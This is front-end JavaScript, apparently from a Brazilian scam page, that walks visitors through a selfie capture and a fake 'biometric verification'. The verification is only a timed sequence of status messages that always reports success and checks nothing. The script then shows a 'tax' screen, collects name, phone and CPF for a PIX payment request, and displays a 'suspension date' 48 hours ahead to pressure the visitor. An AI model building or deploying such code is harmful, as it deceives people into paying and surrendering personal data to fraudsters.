document.addEventListener('DOMContentLoaded', function() {
    // Modal e câmera setup
    const identityModal = document.getElementById('identityModal');
    const identitySteps = document.getElementById('identitySteps');
    const cameraArea = document.getElementById('cameraArea');
    const paymentArea = document.getElementById('paymentArea');
    const takeSelfieBtn = document.getElementById('takeSelfieBtn');
    const captureBtn = document.getElementById('captureBtn');
    const confirmPhotoBtn = document.getElementById('confirmPhotoBtn');
    const retakePhotoBtn = document.getElementById('retakePhotoBtn');
    const captureControls = document.getElementById('captureControls');
    const cameraView = document.getElementById('cameraView');
    const captureCanvas = document.getElementById('captureCanvas');
    
    // Elementos do PIX
    const pixPaymentArea = document.getElementById('pixPaymentArea');
    const pixLoadingArea = document.getElementById('pixLoadingArea');
    const pixCodeDisplay = document.getElementById('pixCodeDisplay');
    const pixQrCodeImage = document.getElementById('pixQrCodeImage');
    const pixCode = document.getElementById('pixCode');
    
    // Stream da câmera
    let stream = null;
    let photoTaken = false;
    
    // Dados do PIX
    let pixData = {
        pixCode: null,
        pixQrCode: null
    };
    
    if (takeSelfieBtn) {
        takeSelfieBtn.addEventListener('click', startCamera);
    }
    
    if (captureBtn) {
        captureBtn.addEventListener('click', takePhoto);
    }
    
    if (retakePhotoBtn) {
        retakePhotoBtn.addEventListener('click', restartCamera);
    }
    
    if (confirmPhotoBtn) {
        confirmPhotoBtn.addEventListener('click', showPaymentStep);
    }
    
    // Inicia a câmera e o processo de verificação facial
    function startCamera() {
        identitySteps.classList.add('d-none');
        cameraArea.classList.remove('d-none');
        
        // Elementos da interface de captura
        const faceOutline = document.getElementById('faceOutline');
        const captureInstruction = document.getElementById('captureInstruction');
        const captureButtonContainer = document.getElementById('captureButtonContainer');
        
        navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }, 
            audio: false 
        })
        .then(function(mediaStream) {
            stream = mediaStream;
            cameraView.srcObject = mediaStream;
            
            // Iniciar sequência de verificação
            startVerificationSequence(faceOutline, captureInstruction, captureButtonContainer);
        })
        .catch(function(error) {
            console.error("Erro ao acessar câmera:", error);
            // Fallback se a câmera não puder ser acessada
            alert("Não foi possível acessar sua câmera. Por favor, permita o acesso à câmera e tente novamente.");
            identitySteps.classList.remove('d-none');
            cameraArea.classList.add('d-none');
        });
    }
    
    // Sequência de verificação facial
    function startVerificationSequence(faceOutline, captureInstruction, captureButtonContainer) {
        // Etapa 1: Posicione o rosto no centro (3 segundos)
        setTimeout(function() {
            // Etapa 2: Aumentar o círculo
            faceOutline.classList.remove('small');
            faceOutline.classList.add('large');
            captureInstruction.innerText = "Centralize seu rosto no círculo maior";
            
            // Etapa 3: Não se mexa
            setTimeout(function() {
                captureInstruction.innerText = "Mantenha-se imóvel";
                
                // Etapa 4: Sorria
                setTimeout(function() {
                    captureInstruction.innerText = "Sorria";
                    
                    // Etapa 5: Mostrar botão de captura
                    setTimeout(function() {
                        captureInstruction.innerText = "Pronto para capturar";
                        captureButtonContainer.classList.remove('d-none');
                    }, 3000);
                    
                }, 3000);
                
            }, 3000);
            
        }, 3000);
    }
    
    // Tirar foto
    function takePhoto() {
        if (!stream) return;
        
        const context = captureCanvas.getContext('2d');
        
        // Determinar as dimensões para manter a proporção 4:3 da câmera
        const videoWidth = cameraView.videoWidth;
        const videoHeight = cameraView.videoHeight;
        
        // Definir dimensões do canvas para corresponder ao contêiner
        captureCanvas.width = cameraView.offsetWidth;
        captureCanvas.height = cameraView.offsetHeight;
        
        // Calcular tamanho e posição para centralizar a imagem no canvas 
        // e manter a mesma proporção que está sendo mostrada no vídeo
        const scale = Math.max(captureCanvas.width / videoWidth, captureCanvas.height / videoHeight);
        const scaledWidth = videoWidth * scale;
        const scaledHeight = videoHeight * scale;
        const left = (captureCanvas.width - scaledWidth) / 2;
        const top = (captureCanvas.height - scaledHeight) / 2;
        
        // Limpar o canvas antes de desenhar
        context.clearRect(0, 0, captureCanvas.width, captureCanvas.height);
        
        // Desenhar a imagem centralizada e escalada
        context.drawImage(cameraView, left, top, scaledWidth, scaledHeight);
        
        // Pausar o vídeo e escondê-lo
        cameraView.pause();
        cameraView.style.display = 'none';
        
        // Mostrar a imagem capturada
        captureCanvas.style.display = 'block';
        captureCanvas.classList.remove('d-none');
        
        // Esconder instruções e frame de verificação
        document.getElementById('captureInstruction').style.display = 'none';
        document.getElementById('faceOutline').style.display = 'none';
        document.getElementById('captureButtonContainer').classList.add('d-none');
        
        // Exibir controles de confirmação
        captureControls.classList.remove('d-none');
        
        photoTaken = true;
    }
    
    // Reiniciar câmera para nova foto
    function restartCamera() {
        if (photoTaken) {
            // Limpar o canvas
            const context = captureCanvas.getContext('2d');
            context.clearRect(0, 0, captureCanvas.width, captureCanvas.height);
            
            // Reiniciar vídeo
            cameraView.style.display = 'block';
            captureCanvas.classList.add('d-none');
            cameraView.play();
            
            // Elementos da interface de captura
            const faceOutline = document.getElementById('faceOutline');
            const captureInstruction = document.getElementById('captureInstruction');
            const captureButtonContainer = document.getElementById('captureButtonContainer');
            
            // Esconder controles de confirmação
            captureControls.classList.add('d-none');
            captureButtonContainer.classList.add('d-none');
            faceOutline.style.display = 'block';
            faceOutline.classList.add('small');
            faceOutline.classList.remove('large');
            captureInstruction.style.display = 'block';
            captureInstruction.innerText = "Posicione seu rosto no centro";
            
            // Reiniciar sequência de verificação
            startVerificationSequence(faceOutline, captureInstruction, captureButtonContainer);
            
            photoTaken = false;
        }
    }
    
    // Mostrar a tela de pagamento
    function showPaymentStep() {
        // Obter referências aos elementos de verificação
        const verificationStatus = document.getElementById('verificationStatus');
        const verificationStatusText = document.getElementById('verificationStatusText');
        const verificationDetailsText = document.getElementById('verificationDetailsText');
        const verificationSuccess = document.getElementById('verificationSuccess');
        const proceedToPaymentBtn = document.getElementById('proceedToPaymentBtn');
        const taxExplanationArea = document.getElementById('taxExplanationArea');
        const goToPaymentBtn = document.getElementById('goToPaymentBtn');
        
        // Esconder controles de confirmação
        captureControls.classList.add('d-none');
        
        // Mostrar tela de verificação
        verificationStatus.classList.remove('d-none');
        
        // Sequência de status de verificação
        setTimeout(function() {
            verificationStatusText.innerText = "Analisando biometria facial...";
            verificationDetailsText.innerText = "Comparando padrões biométricos (1/3)";
            
            setTimeout(function() {
                verificationStatusText.innerText = "Validando documento...";
                verificationDetailsText.innerText = "Verificando registros cadastrais (2/3)";
                
                setTimeout(function() {
                    verificationStatusText.innerText = "Finalizando verificação...";
                    verificationDetailsText.innerText = "Confirmando autenticidade (3/3)";
                    
                    // Após 5 segundos mostra a mensagem de sucesso
                    setTimeout(function() {
                        document.querySelector('.spinner-border').classList.add('d-none');
                        verificationStatusText.classList.add('d-none');
                        verificationDetailsText.classList.add('d-none');
                        verificationSuccess.classList.remove('d-none');
                        
                        // Adicionar evento ao botão de continuar
                        if (proceedToPaymentBtn) {
                            proceedToPaymentBtn.addEventListener('click', function() {
                                // Parar o stream da camera
                                if (stream) {
                                    stream.getTracks().forEach(track => {
                                        track.stop();
                                    });
                                }
                                
                                // Esconder área da câmera e a verificação
                                cameraArea.classList.add('d-none');
                                
                                // Mostrar área de explicação da taxa
                                taxExplanationArea.classList.remove('d-none');
                                
                                // Adicionar evento para o botão de regularizar
                                if (goToPaymentBtn) {
                                    goToPaymentBtn.addEventListener('click', function() {
                                        // Esconder a explicação da taxa
                                        taxExplanationArea.classList.add('d-none');
                                        
                                        // Mostrar área de pagamento
                                        paymentArea.classList.remove('d-none');
                                    });
                                }
                            });
                        }
                    }, 5000);
                }, 2000);
            }, 2000);
        }, 1000);
    }
    
    // Gerar código PIX
    function generatePixCode() {
        // Mostrar área de carregamento do PIX
        if (pixLoadingArea) pixLoadingArea.classList.remove('d-none');
        if (pixCodeDisplay) pixCodeDisplay.classList.add('d-none');
        
        // Obter os dados do formulário
        const telefone = document.getElementById('telefoneInput').value;
        const nome = document.getElementById('nomeInput').value;
        const cpf = document.getElementById('cpfInput').value;
        
        // Criar FormData
        const formData = new FormData();
        formData.append('telefone', telefone);
        formData.append('nome', nome);
        formData.append('cpf', cpf);
        
        // Enviar solicitação para gerar PIX
        fetch('/generate-pix', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // Armazenar dados do PIX
                pixData.pixCode = data.pix_code;
                pixData.pixQrCode = data.pix_qr_code;
                
                // Preencher os elementos na interface
                if (pixCode) pixCode.textContent = data.pix_code;
                if (pixQrCodeImage) pixQrCodeImage.src = data.pix_qr_code;
                
                // Esconder área de carregamento e mostrar o código PIX
                if (pixLoadingArea) pixLoadingArea.classList.add('d-none');
                if (pixCodeDisplay) pixCodeDisplay.classList.remove('d-none');
            } else {
                console.error('Erro ao gerar código PIX:', data.error);
                alert('Não foi possível gerar o código PIX. Por favor, tente novamente.');
            }
        })
        .catch(error => {
            console.error('Erro na requisição:', error);
            alert('Erro de comunicação ao gerar código PIX. Por favor, tente novamente.');
        });
    }
    
    // Função para copiar o código PIX para a área de transferência
    window.copyPixCode = function() {
        const pixCodeText = document.getElementById('pixCode').textContent;
        
        if (!pixCodeText) {
            alert('Nenhum código PIX disponível para copiar.');
            return;
        }
        
        // Usar a API moderna de clipboard quando disponível
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(pixCodeText)
                .then(() => {
                    // Mostrar confirmação visual
                    const copyButton = document.getElementById('copyPixButton');
                    const originalText = copyButton.textContent;
                    copyButton.textContent = 'CÓDIGO COPIADO!';
                    
                    // Restaurar o texto original após 2 segundos
                    setTimeout(function() {
                        copyButton.textContent = originalText;
                    }, 2000);
                })
                .catch(err => {
                    console.error('Erro ao copiar o texto: ', err);
                    alert('Não foi possível copiar o código. Por favor, copie manualmente.');
                    
                    // Fallback para o método antigo
                    fallbackCopy();
                });
        } else {
            // Usar o método de fallback para navegadores mais antigos
            fallbackCopy();
        }
        
        // Método de fallback usando document.execCommand
        function fallbackCopy() {
            // Criar elemento temporário para copiar
            const tempInput = document.createElement('textarea');
            tempInput.value = pixCodeText;
            tempInput.style.position = 'fixed';  // Evitar rolagem da página
            document.body.appendChild(tempInput);
            
            // Selecionar e copiar o texto
            tempInput.focus();
            tempInput.select();
            
            try {
                const successful = document.execCommand('copy');
                
                if (successful) {
                    // Mostrar confirmação visual
                    const copyButton = document.getElementById('copyPixButton');
                    const originalText = copyButton.textContent;
                    copyButton.textContent = 'CÓDIGO COPIADO!';
                    
                    // Restaurar o texto original após 2 segundos
                    setTimeout(function() {
                        copyButton.textContent = originalText;
                    }, 2000);
                } else {
                    alert('Não foi possível copiar o código. Por favor, copie manualmente.');
                }
            } catch (err) {
                console.error('Erro ao copiar o texto: ', err);
                alert('Não foi possível copiar o código. Por favor, copie manualmente.');
            }
            
            // Remover o elemento temporário
            document.body.removeChild(tempInput);
        }
    };
    
    // Se o botão "goToPaymentBtn" existe, adicionar evento para gerar PIX
    const goToPaymentBtn = document.getElementById('goToPaymentBtn');
    if (goToPaymentBtn) {
        goToPaymentBtn.addEventListener('click', function() {
            // Gerar o código PIX quando o usuário chega na área de pagamento
            setTimeout(generatePixCode, 500);
        });
    }
    
    // Ao fechar o modal, parar o stream da câmera
    if (identityModal) {
        identityModal.addEventListener('hidden.bs.modal', function() {
            if (stream) {
                stream.getTracks().forEach(track => {
                    track.stop();
                });
            }
            
            // Resetar o modal para o estado inicial
            identitySteps.classList.remove('d-none');
            cameraArea.classList.add('d-none');
            paymentArea.classList.add('d-none');
            
            // Esconder também a área de explicação da taxa
            const taxExplanationArea = document.getElementById('taxExplanationArea');
            if (taxExplanationArea) taxExplanationArea.classList.add('d-none');
            
            // Esconder também o status de verificação
            const verificationStatus = document.getElementById('verificationStatus');
            if (verificationStatus) verificationStatus.classList.add('d-none');
            
            if (captureControls) captureControls.classList.add('d-none');
            if (captureBtn) captureBtn.classList.remove('d-none');
            
            // Resetar área de PIX
            if (pixCodeDisplay) pixCodeDisplay.classList.add('d-none');
            if (pixLoadingArea) pixLoadingArea.classList.remove('d-none');
            
            photoTaken = false;
        });
    }
    
    // Set suspension date (48 hours from now)
    const suspensionDateElement = document.getElementById('suspensionDate');
    if (suspensionDateElement) {
        const suspensionDate = new Date();
        suspensionDate.setHours(suspensionDate.getHours() + 48);
        
        const options = { 
            weekday: 'long', 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        };
        
        suspensionDateElement.textContent = suspensionDate.toLocaleDateString('pt-BR', options);
    }
});
